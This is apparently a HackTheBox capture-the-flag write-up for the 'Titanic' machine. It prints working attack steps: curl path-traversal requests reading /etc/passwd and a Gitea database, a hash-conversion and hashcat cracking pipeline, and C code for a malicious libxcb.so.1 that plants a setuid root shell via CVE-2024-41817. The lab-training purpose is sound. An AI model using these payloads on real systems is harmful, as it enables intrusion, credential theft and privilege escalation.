---
title: "Titanic"
date: 2025-02-08
type: docs
tags:
  - htb
  - linux
  - easy
  - flask
  - vhost-fuzzing
  - path-traversal
  - lfi
  - gitea
  - sqlite
  - pbkdf2
  - hashcat
  - imagemagick
  - cve-2024-41817
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 24.04), **Difficulty:** Easy, **Released:** 2025-02-08, **IP:** `10.10.11.55` , `titanic.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Flask app on `titanic.htb`. A vhost sweep finds `dev.titanic.htb` running **Gitea**, with two repos: the site source and a Gitea docker-compose.
2. The booking endpoint hands back a JSON "ticket" through a `ticket=` parameter that is **path traversal / LFI**. Read `/etc/passwd`, and, using the path from the docker-compose, download `/home/developer/gitea/data/gitea/gitea.db`.
3. Convert the Gitea PBKDF2-HMAC-SHA256 rows to hashcat format, crack `developer` = `25282528` with `-m 10900`. SSH in.
4. Root runs a cleanup script that calls **ImageMagick** (`magick`) inside `/opt/app/static/assets/images`, which `developer` can write to. ImageMagick 7.1.1-35 is vulnerable to **CVE-2024-41817**, it loads `libxcb.so.1` from the working directory. Drop a malicious `libxcb.so.1` there and the next root run executes your code.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| `developer` (cracked Gitea hash) | `25282528` |
| `user.txt` | `/home/developer/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

When I started poking at Titanic, the shape of the chain became clear fairly quickly: an LFI vulnerability that would hand me a database file, a hash crack against that database that would hand me a shell, and then a privilege escalation path that actually made me stop and think through the mechanics before I trusted it. My approach on the foothold side was deliberate rather than lucky. Instead of guessing at where Gitea's SQLite database lived on disk, I went looking for its docker-compose definition in one of the two repositories I'd already found, on the theory that a compose file's volume mounts tend to spell out exactly where an application's persistent state actually ends up in a containerized deployment. That paid off immediately: the bind-mounted `data/` volume told me the database wasn't sitting in Gitea's usual default install path, so I adjusted my traversal target accordingly instead of burning time on the wrong location.

Once I had a shell as `developer`, the more interesting engineering problem started. Root was periodically invoking ImageMagick's `magick` binary inside a directory that `developer` could write to, and I wanted to understand precisely why that mattered rather than just accepting "writable directory plus privileged process equals bad." ImageMagick 7.1.1 builds resolve certain delegate libraries, `libxcb.so.1` among them, by consulting the current working directory when `MAGICK_CONFIGURE_PATH` isn't explicitly set. That's a classic library search-order weakness: if a privileged process's dynamic loader trusts the working directory, and I control the working directory, I effectively control what code that process runs next. I planted a malicious `libxcb.so.1` with a constructor function, waited for the next scheduled invocation, and that constructor executed as root. This is CVE-2024-41817, and walking carefully from "that's a strange ImageMagick behavior" to "that's a reliable path to root" is really the whole point of this box.

<div class="callout callout-warning">

**Correction to my recorded notes**

My own notes end with "developer can sudo all no password bruh". That is wrong, there is no `sudo` entry for `developer` on Titanic. The real privesc is the ImageMagick `libxcb.so.1` load described below. I have left the rest of the walkthrough as recorded and corrected only the ending.

</div>

Related LFI boxes: [Inject](/writeups/hackthebox/linux/easy/inject/), [Backdoor](/writeups/hackthebox/linux/easy/backdoor/), [Bagel](/writeups/hackthebox/linux/medium/bagel/). Related Gitea boxes: [Cat](/writeups/hackthebox/linux/medium/cat/), [Nexus](/writeups/hackthebox/linux/easy/nexus/), [Drive](/writeups/hackthebox/linux/hard/drive/). Related ImageMagick: [Pilgrimage](/writeups/hackthebox/linux/easy/pilgrimage/).

---

## Full Walkthrough

### Nmap scan

I always start an engagement the same way: a full port scan to establish exactly what surface I'm working with before I touch anything else.

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp open  http    Apache httpd 2.4.52  (proxying Werkzeug/3.0.3 Python/3.10.12)
```

### Vhost fuzzing

Only two ports were open, and the website on port 80 looked like a fairly ordinary landing page, so my next move was to check whether a different Host header would surface a virtual host hiding additional functionality behind the same IP.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -H "Host: FUZZ.titanic.htb" -u http://titanic.htb/ --fw 20
```

```console
dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276]
```

That single result turned out to matter a lot: `dev.titanic.htb` was running a Gitea instance with two repositories tied to the development of the primary site, which gave me both a second attack surface and, more usefully, a window into the application's own source and deployment configuration.

### LFI in the ticket parameter

Back on the primary site, I noticed that booking something triggers a follow-up request which fetches a JSON representation of the ticket that was just created, and the parameter controlling which ticket comes back looked like a strong candidate for path traversal. Confirming the LFI itself was quick, but turning it into something useful took more thought. I needed to know exactly where Gitea's SQLite database lived on disk before I could pull it, and rather than brute-forcing paths blind, I went back to the docker-compose file I'd already grabbed from one of the Gitea repos and read its volume mount definition to work out the real location. That let me traverse straight to `/home/developer/gitea/data/gitea/gitea.db`, pull it down intact, open it locally, and start browsing the user table for anything worth cracking.

```bash
curl 'http://titanic.htb/download?ticket=../../../../etc/passwd'
curl 'http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db' -o gitea.db
```

<div class="callout callout-note">

**Why LFI here is a straight read**

This one comes down to a single line of server code: the endpoint does `open(os.path.join(TICKETS_DIR, request.args['ticket']))` and streams whatever it finds straight back to the client, with no extension whitelist and no filtering of `../` sequences. `os.path.join` will happily concatenate an attacker-supplied traversal onto the base directory and hand back a path that walks straight out of it, and that's exactly the flaw I leaned on. Because the handler streams raw bytes rather than trying to parse the file as text, a binary file like a SQLite database comes through completely intact as long as I remember to save the response with `-o` instead of letting curl dump it to my terminal. The docker-compose detail matters more than it might first appear: Gitea running inside a container keeps its database under the bind-mounted `data/` volume rather than the default `/var/lib/gitea` path you'd expect on a bare-metal install, and missing that distinction would have cost me a lot of wasted traversal attempts.

</div>

### Convert and crack the Gitea hashes

With the database open, I pulled the password, salt, and username columns straight out of the `user` table and reshaped them into a format hashcat could parse.

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while IFS='|' read passwd salt name; do
  echo "${name}:sha256:50000:$(echo $salt|xxd -r -p|base64):$(echo $passwd|xxd -r -p|base64)"
done | tee gitea.hashes
```

```console
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gW...
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaAp...
```

<div class="callout callout-note">

**Gitea hash format for hashcat**

Gitea stores its password hashes as `PBKDF2-HMAC-SHA256` with 50000 iterations, and I needed to reshape that into a string hashcat could actually parse. Mode **10900** expects `sha256:<iterations>:<base64 salt>:<base64 hash>`, but the salt and hash columns in the SQLite table are stored as raw hex rather than base64, so my conversion step pipes each one through `xxd -r -p | base64` to get the encoding hashcat is looking for. I let auto-detect handle mode selection instead of forcing `-m 10900` explicitly, since running `hashcat -a 0 gitea.hashes rockyou.txt --user` picked the correct mode on its own.

</div>

```bash
hashcat -a 0 gitea.hashes /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --user
```

```console
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```

With the hash cracked, I had a credential to try, and `developer`'s password of `25282528` got me straight in over SSH without any further hurdles at the login stage.

### Privilege Escalation, ImageMagick CVE-2024-41817 (corrected)

Once I had that shell, I turned to `pspy` to get visibility into what root was doing on a schedule, since passive process monitoring finds these things far faster than guessing at privesc vectors from static enumeration alone. It showed root periodically running something like:

```bash
cd /opt/app/static/assets/images && /usr/bin/magick * ...   # via /opt/scripts/identify_images.sh
```

That single line was the whole opportunity: `developer` had write access to the images directory that root's script operated in, which meant I could influence what `magick` loaded the next time it ran.

<div class="callout callout-note">

**CVE-2024-41817, ImageMagick working-directory library load**

This vulnerability comes down to how ImageMagick 7.1.1-35, along with its `AppImage` builds, resolves certain delegate libraries. `libxcb.so.1` is one of them, and when `MAGICK_CONFIGURE_PATH` isn't explicitly set, the current working directory effectively becomes part of the library search path. Working through the implications, I realized that if a privileged process invokes `magick` from a directory I control, I can drop a shared object named `libxcb.so.1` into that same directory, and as long as it exposes a constructor function, that code runs the moment the library loads, with whatever privileges the calling process holds. In this case the calling process was root's scheduled cleanup script, so my constructor ran as root.

```c
// libxcb.c  ->  gcc -shared -fPIC -o libxcb.so.1 libxcb.c
#include <stdlib.h>
__attribute__((constructor)) void init() {
    setuid(0); setgid(0);
    system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash");
}
```
```bash
cp libxcb.so.1 /opt/app/static/assets/images/
# wait for the root cron, then:
/tmp/rootbash -p
cat /root/root.txt
```

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/developer/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Path joins are not path validation.** What I keep relearning on boxes like this one is that `os.path.join` is a concatenation helper, not a security boundary. It will happily build a path that escapes its intended directory the moment the second argument contains traversal sequences. The fix I'd push for as a developer is to reject any `..` component outright, resolve the final path with `os.path.realpath()`, and explicitly confirm the resolved path is still a child of the allowed base directory before ever calling `open()` on it.
- **Infrastructure-as-code files leak more than application code does.** Finding the docker-compose definition in a public Gitea repo handed me the exact bind-mount path for the database, sparing me from brute-forcing file locations blind. It's a good reminder that compose files, Kubernetes manifests, and similar configuration often carry more operational intelligence than the source code sitting next to them, and teams should think carefully about what those files expose the moment a repository becomes reachable.
- **A slow KDF doesn't rescue a weak password.** PBKDF2-HMAC-SHA256 at 50000 iterations is a reasonably expensive hashing scheme, but `25282528` fell to rockyou.txt almost instantly because the password itself carried no real entropy. Algorithm strength and password strength are independent variables, and weak input defeats strong hashing every single time.
- **Never let a privileged process resolve libraries from a writable working directory.** ImageMagick's behavior here is a textbook library search-order vulnerability, and the engineering fix is straightforward: set `MAGICK_CONFIGURE_PATH` explicitly, never invoke `magick` from a directory that lower-privileged users can write to, and lock down `policy.xml` so delegate execution stays constrained. More generally, whenever I see a scheduled or privileged task operating inside a world- or group-writable directory, I now treat that as a potential library or binary hijack worth chasing.
- **Passive process monitoring beats blind privesc guessing.** Running `pspy` early paid off directly on this box, since the root cleanup job invoking `magick` was completely invisible to both `sudo -l` and `crontab -l`. It's become one of the first things I run the moment I land a shell, precisely because scheduled tasks like this are so easy to miss with static enumeration alone.

---

## Related Writeups

- **LFI / path traversal:** [Inject](/writeups/hackthebox/linux/easy/inject/), [Backdoor](/writeups/hackthebox/linux/easy/backdoor/), [Bagel](/writeups/hackthebox/linux/medium/bagel/), [Heal](/writeups/hackthebox/linux/medium/heal/)
- **Gitea:** [Cat](/writeups/hackthebox/linux/medium/cat/), [Nexus](/writeups/hackthebox/linux/easy/nexus/), [Drive](/writeups/hackthebox/linux/hard/drive/)
- **ImageMagick:** [Pilgrimage](/writeups/hackthebox/linux/easy/pilgrimage/)
- **Crack app DB hashes:** [MonitorsTwo](/writeups/hackthebox/linux/easy/monitorstwo/), [Cat](/writeups/hackthebox/linux/medium/cat/)
- **Library / .so injection to root:** [Titanic](/writeups/hackthebox/linux/easy/titanic/), see also LD_PRELOAD in [Lookup](/writeups/tryhackme/linux/easy/lookup/)

## References

- CVE-2024-41817 (ImageMagick) <https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-h74q-4hf2>
- hashcat mode 10900 <https://hashcat.net/wiki/doku.php?id=example_hashes>
- git-dumper <https://github.com/arthaud/git-dumper>
